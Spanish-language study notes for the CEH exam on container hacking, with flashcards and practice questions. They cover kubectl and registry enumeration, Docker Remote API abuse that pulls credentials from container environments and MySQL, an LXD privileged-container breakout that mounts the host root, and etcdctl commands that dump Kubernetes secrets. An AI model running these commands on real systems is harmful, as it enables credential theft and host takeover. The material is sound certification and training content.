# M19_09 — Container Hacking
**Módulo 19 / Subapartado 9 — Container Hacking**

---

## 1. Conceptos y definiciones

### 🔴 kubectl — Information Gathering

kubectl es la herramienta CLI para interactuar con clusters Kubernetes.

```bash
# Pods
kubectl get pods                              # Listar todos los pods
kubectl describe pod <pod-name>              # Información detallada de un pod
kubectl logs <pod-name>                      # Logs de un pod

# Services
kubectl get services                         # Listar todos los servicios
kubectl describe services                    # Información detallada de servicios

# Deployments
kubectl get deployment                       # Listar deployments
kubectl describe deployment <name>          # Detalles de un deployment

# Service Accounts
kubectl get serviceaccounts                  # Listar service accounts
kubectl describe serviceaccounts             # Detalles de service accounts
```

---

### Enumeración de Registries

```bash
# Login en un registry
docker login <registry-url>

# Listar repositorios de un usuario en Docker Hub
curl -s https://hub.docker.com/v2/repositories/<username>/

# Listar imágenes en un registry privado (Registry API)
curl -u <user>:<pass> https://<registry-url>/v2/_catalog

# Listar tags de una imagen específica
curl -u <user>:<pass> https://<registry-url>/v2/<image-name>/tags/list
```

---

### 🔴 Herramientas de Vulnerability Scanning en Containers

| Herramienta | Función específica |
|------------|-------------------|
| **Trivy** | Escaneo automatizado de imágenes; detecta vulnerabilidades en paquetes OS (Alpine, RHEL, CentOS) y dependencias de aplicación (Bundler, Composer, npm, yarn) |
| **Sysdig** | Integra CI/CD pipelines, image registry y Kubernetes admission controllers; genera inventario de contenido de imagen; monitoriza CVEs continuamente |
| **Kubescape** | Escaneo de K8s |
| **kube-hunter** | Escaneo de K8s |
| **kubeaudit** | Auditoría de K8s |
| **KubiScan** | Escaneo de K8s |
| **Krane** | Escaneo de K8s |
| **Anchore, Clair, Dadga, snyk container** | Herramientas adicionales de escaneo de imágenes |

**Trivy — sintaxis:**
```bash
trivy <target> [--scanners <scanner1,scanner2>] <subject>
```

---

### 🔴 Docker Remote API — explotación

Cuando el Docker Remote API está expuesto, los atacantes pueden:
- Minar criptomoneda
- Enmascarar IPs para ataques
- Crear botnets para DoS
- Instalar servicios para phishing
- Recuperar credenciales
- Comprometer la red interna

#### Recuperar ficheros del Docker host

```bash
# Obtener imagen Alpine
docker -H <Remote_IP:Port> pull alpine

# Crear contenedor desde la imagen
docker -H <Remote_IP:Port> run -t -d alpine

# Ejecutar ls dentro del contenedor (para ver ficheros del host)
docker -H <Remote_IP:Port> exec modest_goldstine ls
```

Para acceder a `/etc/hosts` del host: montar el path `/etc` del host en el contenedor.

Para detectar mounts externos (S3, NFS): usar `docker inspect`.

#### Escanear red interna desde Docker

```bash
# Crear contenedor en la red bridge del host y usar nmap para escanear
docker -H <docker_host> run --network=host --rm marsmensch/nmap -ox <IP_Range>
```

#### Recuperar credenciales de variables de entorno

```bash
# Inspeccionar variables de entorno del contenedor
docker -H [docker_remote_host] inspect [container_name]

# Ejecutar env dentro del contenedor
docker -H [docker_remote_host] exec -i [container_name] env
```

#### Consultar bases de datos MySQL

```bash
# Encontrar contenedores MySQL
docker -H [docker_remote_host] ps | grep mysql

# Recuperar credenciales MySQL
docker -H [docker_remote_host] exec -i some-mysql env

# Listar bases de datos con credenciales obtenidas
docker -H [docker_host] exec -i some-mysql mysql -u root -p <password> -e "show databases"
```

> Todas estas actividades requieren **privilegios administrativos**.

---

### Hacking de Container Volumes en Kubernetes

Volúmenes en K8s: directorios compartidos por todos los contenedores de un pod. Soportan NFS, iSCSI y otros protocolos.

**Tres vectores de acceso:**

| Vector | Mecanismo |
|--------|----------|
| **Acceso a Master Nodes** | iSCSI almacena configuración en secretos → si el atacante accede a la API o **etcd** → recupera config de volúmenes |
| **Acceso a Nodes** | kubelet gestiona pods → acceso a un nodo → acceso a todos los volúmenes del pod. Comando `df` para recuperar config de volúmenes NFS |
| **Acceso a Container** | Configurar `hostpath` volume type → recuperar información sensible del nodo; usar filesystem tools para browsear volúmenes montados |

> Requiere **privilegios administrativos**.

---

### 🔴 LXD/LXC Group Privilege Escalation

**LXD**: system container manager. **LXC**: container runtime subyacente. Se usan para ejecutar distribuciones Linux completas en contenedores.

**Vector**: si un usuario es miembro del grupo **`lxd`**, puede crear contenedores privilegiados y montar el filesystem del host → acceso root al sistema.

```bash
# Verificar membresía en grupo lxd
id

# Crear imagen Alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Construir la imagen con distrobuilder
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml image.release=3.18

# Importar imagen en LXD
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Verificar imagen disponible
lxc image list

# Crear contenedor PRIVILEGIADO
lxc init alpine privesc -c security.privileged=true

# Listar contenedores
lxc list

# Montar filesystem COMPLETO del host en el contenedor
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# Arrancar contenedor y obtener shell
lxc start privesc
lxc exec privesc /bin/sh
# Desde aquí: /mnt/root = filesystem completo del host → acceso root
```

**Flag crítico**: `-c security.privileged=true` → crea el contenedor en modo privilegiado.
**Mount crítico**: `source=/` → monta todo el sistema de ficheros del host.

---

### 🔴 Post-Enumeration en etcd

**etcd**: almacenamiento key-value distribuido y consistente donde K8s guarda datos del cluster, service discovery y objetos API. **Acceder a etcd = acceso root al sistema**.

En K8s, **solo el API server** tiene autorización para acceder al etcd store.

Puerto por defecto de etcd: **2379**.

```bash
# Identificar localización del etcd server y PKI
ps -ef | grep apiserver

# Enumerar secretos almacenados en el cluster K8s
ETCDCTL_API=3 ./etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt \
  --key=/etc/kubernetes/pki/apiserver-etcd-client.key \
  --endpoints=https://127.0.0.1:2379 \
  get /registry/ --prefix | grep -a '/registry/secrets/'

# Recuperar una clave específica y convertirla a YAML
ETCDCTL_API=3 ./etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt \
  --key=/etc/kubernetes/pki/apiserver-etcd-client.key \
  --endpoints=https://127.0.0.1:2379 \
  get /registry/secrets/kube-system/weave-net-token-nmb26 | ./auger decode -o yaml
```

**Información obtenida del etcd:** certificados, key files, secretos del cluster, endpoints desde el kube config file → escalada de privilegios + acceso a nodos.

> Requiere **privilegios administrativos**.

---

## 2. Exam Traps ⚠️

⚠️ **[etcd — equivalencia con root]**
Acceder al etcd de Kubernetes es equivalente a obtener **acceso root al sistema**. El examen puede presentarlo como un acceso de usuario privilegiado genérico.

⚠️ **[etcd — puerto]**
El puerto por defecto de etcd es **2379**. El examen puede presentar otros puertos (ej. 2380 que es para peer communication, no para client API).

⚠️ **[etcd — único componente autorizado]**
En K8s, **solo el API server** puede acceder al etcd store. El examen puede afirmar que kubelet u otros componentes también acceden directamente.

⚠️ **[LXD — flag de escalada]**
El flag crítico para privilege escalation es `-c security.privileged=true`. Sin este flag, el contenedor no tiene privilegios sobre el host. El examen puede presentar otros flags como equivalentes.

⚠️ **[LXD — mount del filesystem]**
El mount `source=/ path=/mnt/root recursive=true` da acceso a **todo el filesystem del host** desde `/mnt/root` dentro del contenedor. La clave es `source=/` (raíz). El examen puede presentar paths parciales como equivalentes.

⚠️ **[LXD — condición de explotación]**
La condición necesaria es que el usuario sea miembro del grupo **`lxd`**. Sin esa membresía, la técnica no aplica. El examen puede presentarla como exploitable por cualquier usuario.

⚠️ **[Docker Remote API — credenciales en env]**
Las credenciales se recuperan con `docker exec -i [container] env`. El comando `docker inspect` muestra las variables definidas pero `env` las muestra en ejecución. El examen puede confundir `inspect` con `env` para recuperar credenciales activas.

⚠️ **[Trivy — alcance de escaneo]**
Trivy escanea tanto **paquetes OS** (Alpine, RHEL, CentOS) como **dependencias de aplicación** (Bundler, Composer, npm, yarn). El examen puede presentarlo como solo OS o solo aplicación.

⚠️ **[Sysdig — integración K8s]**
Sysdig valida imágenes a nivel de orquestación usando el **Kubernetes admission controller**. El examen puede confundirlo con un escáner de imágenes estático standalone.

⚠️ **[Docker Remote API — escaneo de red interna]**
El escaneo de red interna requiere crear el contenedor con `--network=host`. Sin este flag, el contenedor está en una red aislada y no puede acceder a los hosts de la red interna del Docker host.

---

## 3. Nemotécnicos

### kubectl — comandos por recurso
**"get → describe → logs"** para cualquier objeto K8s:
- Pods: `get pods` → `describe pod <n>` → `logs <n>`
- Services: `get services` → `describe services`
- Deployments: `get deployment` → `describe deployment <n>`
- Service Accounts: `get serviceaccounts` → `describe serviceaccounts`

### Docker Remote API — secuencia de explotación
**"Pull → Run → Exec → Inspect → Env → MySQL"**
→ pull (imagen) | run (crear contenedor) | exec ls (ficheros) | inspect (vars/mounts) | env (credenciales) | mysql query (datos)

### LXD Privilege Escalation — secuencia
**"id → wget → build → import → init(-privileged) → config(source=/) → start → exec"**
→ verificar grupo lxd | descargar yaml | distrobuilder build-lxd | lxc image import | lxc init -c security.privileged=true | lxc config device add (source=/) | lxc start | lxc exec /bin/sh

### etcd — datos clave
- Puerto: **2379**
- Acceso = **root** del sistema
- Solo lo accede: **kube-apiserver**
- Localizar: `ps -ef | grep apiserver`
- Herramienta: `etcdctl` con `ETCDCTL_API=3`
- Convertir output: `auger decode -o yaml`

### Herramientas de scanning de containers
**"Trivy-Sysdig"** son los dos principales del libro.
Resto: Kubescape, kube-hunter, kubeaudit, KubiScan, Krane, Anchore, Clair, snyk.

---

## 4. Flashcards

**Q:** ¿Qué comando kubectl muestra los logs de un pod específico?
**A:** `kubectl logs <pod-name>`

---

**Q:** ¿Cómo se listan las imágenes disponibles en un registry privado usando la Registry API?
**A:** `curl -u <user>:<pass> https://<registry-url>/v2/_catalog`

---

**Q:** ¿Qué herramienta de vulnerability scanning de containers integra Kubernetes admission controllers y valida imágenes a nivel de orquestación?
**A:** Sysdig. También integra pipelines CI/CD y genera inventario continuo de CVEs.

---

**Q:** ¿Qué paquetes OS y dependencias de aplicación detecta Trivy?
**A:** OS: Alpine, RHEL, CentOS. Dependencias: Bundler, Composer, npm, yarn.

---

**Q:** ¿Cómo se recuperan credenciales de variables de entorno de un contenedor vía Docker Remote API?
**A:** `docker -H [host] exec -i [container] env`

---

**Q:** ¿Cómo se escanea la red interna del host Docker desde un contenedor?
**A:** `docker -H <host> run --network=host --rm marsmensch/nmap -ox <IP_Range>`
El flag `--network=host` es crítico para acceder a la red interna.

---

**Q:** ¿Qué equivalencia de acceso representa comprometer el etcd de un cluster Kubernetes?
**A:** Acceso root al sistema. etcd almacena todos los datos del cluster, secretos, service discovery y objetos API.

---

**Q:** ¿Cuál es el puerto por defecto del etcd en Kubernetes?
**A:** 2379.

---

**Q:** ¿Qué componente de Kubernetes es el único con acceso autorizado al etcd?
**A:** El kube-apiserver (API server). Ningún otro componente accede directamente al etcd.

---

**Q:** ¿Qué flag es imprescindible al crear un contenedor LXD para realizar privilege escalation?
**A:** `-c security.privileged=true`. Sin este flag, el contenedor no tiene privilegios sobre el host.

---

**Q:** ¿Qué mount permite acceder a todo el filesystem del host desde un contenedor LXD?
**A:** `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`
El `source=/` monta la raíz completa del host en `/mnt/root` del contenedor.

---

**Q:** ¿Cuál es la condición necesaria para explotar LXD privilege escalation?
**A:** El usuario debe ser miembro del grupo `lxd`. Se verifica con el comando `id`.

---

**Q:** ¿Cómo se enumeran los secretos del cluster Kubernetes usando etcdctl?
**A:** `ETCDCTL_API=3 ./etcdctl --cacert=... --cert=... --key=... --endpoints=https://127.0.0.1:2379 get /registry/ --prefix | grep -a '/registry/secrets/'`

---

**Q:** ¿Qué herramienta convierte el output binario de etcd a formato YAML legible?
**A:** `auger decode -o yaml`. Se usa en el pipeline: `etcdctl get <key> | ./auger decode -o yaml`.

---

**Q:** ¿Qué tres vectores existen para atacar volúmenes en Kubernetes?
**A:** Acceso a Master Nodes (via API o etcd), acceso a Nodes (via kubelet), y acceso a Container (configurando hostpath volume type).

---

**Q:** ¿Qué comando localiza el etcd server y la información PKI en un nodo Kubernetes?
**A:** `ps -ef | grep apiserver`. Muestra los parámetros del kube-apiserver incluyendo la ubicación del etcd y los certificados.

---

## 5. Confusión frecuente

**etcd puerto 2379 vs. 2380**
- Puerto **2379**: API de cliente (client API) → el que usan los atacantes para recuperar datos. Es el puerto que hay que identificar en escaneos.
- Puerto **2380**: comunicación entre peers del cluster etcd (peer communication) → no expone datos directamente a clientes.
- Criterio: si el escenario describe acceso a secretos del cluster K8s → puerto 2379.

---

**docker inspect vs. docker exec env — credenciales**
- `docker inspect [container]`: muestra la configuración estática del contenedor, incluyendo variables de entorno definidas en el momento de la creación.
- `docker exec -i [container] env`: ejecuta `env` dentro del contenedor y devuelve todas las variables de entorno **activas en tiempo de ejecución**.
- Criterio: para recuperar credenciales activas en ejecución → `exec env`. Para ver configuración completa del contenedor → `inspect`.

---

**Trivy vs. Sysdig — cuándo usar cada uno**
- Trivy: escaneo estático de imágenes; detecta vulnerabilidades de OS packages y dependencias de aplicación. Se ejecuta contra una imagen.
- Sysdig: integra en el pipeline K8s; valida imágenes a nivel de admission controller; monitorización continua de CVEs en runtime.
- Criterio: si el escenario describe escaneo de una imagen antes del despliegue → Trivy. Si describe validación durante el despliegue y monitorización continua → Sysdig.

---

**LXD security.privileged vs. hostpath volume (K8s) — técnicas de breakout**
- LXD privileged container: se crea con `-c security.privileged=true` y `source=/` para montar el host. El usuario necesita ser miembro del grupo `lxd`.
- K8s hostpath volume: se configura el tipo de volumen `hostpath` dentro de K8s para acceder a paths del nodo host desde el contenedor.
- Criterio: si el escenario menciona LXD/LXC y grupo `lxd` → LXD privilege escalation. Si menciona K8s volumes y hostpath → K8s volume attack.

---

**etcd acceso directo vs. via kube-apiserver**
- Acceso directo a etcd: solo el kube-apiserver está autorizado. Si un atacante logra acceder directamente (puerto 2379 con los certificados correctos) → tiene acceso root al cluster.
- Acceso via kube-apiserver: el resto de componentes (kubelet, kube-scheduler) interactúan con etcd **indirectamente** a través del apiserver.
- Criterio: si el escenario describe un atacante leyendo secretos directamente de etcd → acceso directo al puerto 2379 con `etcdctl`. No implica pasar por el apiserver.

---

## 6. Preguntas de Práctica — Formato CEH

**P1.** Un pentester está dentro de un contenedor Docker comprometido. Descubre que el usuario es `root` y el host tiene LXD instalado. ¿Qué técnica de container breakout puede usar si es miembro del grupo `lxd`?

A) Crear una imagen LXD con `security.privileged=true` y montar el sistema de ficheros del host  
B) Ejecutar `docker run --privileged` para acceder al host  
C) Explotar el endpoint Docker API en `/var/run/docker.sock`  
D) Crear un K8s pod con `hostPath` volume  

**Respuesta correcta: A**
El **LXD privilege escalation** consiste en: ser miembro del grupo `lxd` → crear una imagen LXD mínima → iniciar un contenedor con `-c security.privileged=true` y `source=/` para montar el sistema de ficheros raíz del host → obtener acceso al host. Este es el breakout específico de LXD/LXC.

---

**P2.** Un analista detecta que un contenedor K8s tiene montado un `hostPath` volume con el path `/`. ¿Qué riesgo específico supone esta configuración?

A) El contenedor no puede comunicarse con otros pods  
B) El contenedor tiene acceso de lectura/escritura a todo el sistema de ficheros del nodo host  
C) El contenedor usa más memoria de la asignada por el scheduler  
D) El contenedor no puede recibir actualizaciones del registry  

**Respuesta correcta: B**
Un **hostPath volume con path `/`** monta el sistema de ficheros raíz del nodo host dentro del contenedor. Esto otorga acceso de lectura/escritura a todos los ficheros del host, incluyendo `/etc/passwd`, configuraciones del sistema y datos de otros contenedores — esencialmente un container breakout completo.

---

**P3.** Un equipo de seguridad quiere escanear imágenes de contenedores en busca de vulnerabilidades de OS packages y dependencias antes del despliegue. ¿Qué herramienta deben usar?

A) Sysdig — para monitorización continua en runtime  
B) Trivy — para escaneo estático de imágenes antes del despliegue  
C) Falco — para detección de comportamientos anómalos en runtime  
D) OPA — para enforcement de políticas de seguridad  

**Respuesta correcta: B**
**Trivy** realiza **escaneo estático de imágenes** de contenedores detectando vulnerabilidades en OS packages y dependencias de aplicación. Se ejecuta contra una imagen antes del despliegue. Sysdig y Falco son para monitorización en runtime. OPA (Open Policy Agent) es para enforcement de políticas.

---

**P4.** Un atacante está dentro de un contenedor comprometido en K8s. Encuentra que el socket Docker `/var/run/docker.sock` está montado dentro del contenedor. ¿Qué puede hacer con este acceso?

A) Solo leer logs de otros contenedores  
B) Comunicarse con el Docker daemon del host y crear un nuevo contenedor privilegiado para breakout  
C) Acceder a los secretos de K8s almacenados en etcd  
D) Modificar las políticas IAM del cluster  

**Respuesta correcta: B**
Si `/var/run/docker.sock` está montado en el contenedor, el atacante puede **comunicarse directamente con el Docker daemon del host** y ejecutar comandos Docker — incluyendo crear un nuevo contenedor con `--privileged` y montar el host. Es una de las misconfigurations más peligrosas en Docker.

---

**P5.** Un CISO examina las Pod Security Policies de K8s y descubre que varios pods se ejecutan con `privileged: true`. ¿Cuál es el riesgo específico de este security context?

A) Los pods consumen más CPU y memoria  
B) Los pods tienen acceso al namespace del kernel del host, habilitando container breakout  
C) Los pods no pueden conectarse a servicios externos  
D) Los pods no pueden ser actualizados sin downtime  

**Respuesta correcta: B**
Los pods con **`privileged: true`** tienen acceso al **namespace del kernel del host** — prácticamente los mismos privilegios que el host. Esto habilita container breakout, acceso a dispositivos del host (`/dev`), carga de módulos del kernel y más. Es una de las configuraciones más peligrosas en K8s.

---

**P6.** Un pentester que ha comprometido un pod K8s quiere moverse lateralmente a otros pods en el mismo namespace. ¿Qué herramienta específica de container pentesting puede usar para escanear y explotar servicios en el cluster?

A) Trivy  
B) Falco  
C) Peirates  
D) OPA  

**Respuesta correcta: C**
**Peirates** es una herramienta de **penetration testing para K8s** que permite: enumerar service accounts, escalar privilegios, moverse lateralmente entre pods y namespaces, y explotar misconfigurations del cluster. Trivy y Falco son de detección/análisis, no de pentesting activo.

---

**P7.** Un administrador K8s detecta con **Falco** que un contenedor intenta ejecutar `chmod` sobre ficheros del sistema. ¿Qué tipo de amenaza detecta Falco con esta alerta?

A) Vulnerabilidad en la imagen base del contenedor  
B) Comportamiento anómalo en runtime que puede indicar escalada de privilegios o exploit  
C) Misconfiguration en la Pod Security Policy  
D) Acceso no autorizado al etcd cluster  

**Respuesta correcta: B**
**Falco** detecta **comportamientos anómalos en runtime** basándose en llamadas al sistema (syscalls). `chmod` sobre ficheros del sistema dentro de un contenedor es una alerta típica de posible escalada de privilegios o explotación activa. Falco no escanea imágenes estáticas (eso es Trivy) ni misconfigurations (eso es OPA).

---

**P8.** Un equipo de seguridad implementa **OPA (Open Policy Agent)** en su cluster K8s. ¿Para qué sirve específicamente OPA en el contexto de container security?

A) Para escanear imágenes en busca de CVEs conocidos  
B) Para detectar comportamientos anómalos de contenedores en runtime  
C) Para aplicar políticas de seguridad consistentes y automáticas en el cluster (ej. bloquear pods privilegiados)  
D) Para analizar permisos IAM y rutas de escalada de privilegios  

**Respuesta correcta: C**
**OPA (Open Policy Agent)** actúa como **admission controller** en K8s para **aplicar políticas de seguridad consistentes**: bloquear pods privilegiados, requerir límites de recursos, prohibir montaje de volúmenes sensibles, etc. Es la solución para K04 (Lack of Centralized Policy Enforcement). No escanea imágenes (Trivy) ni detecta runtime behavior (Falco).
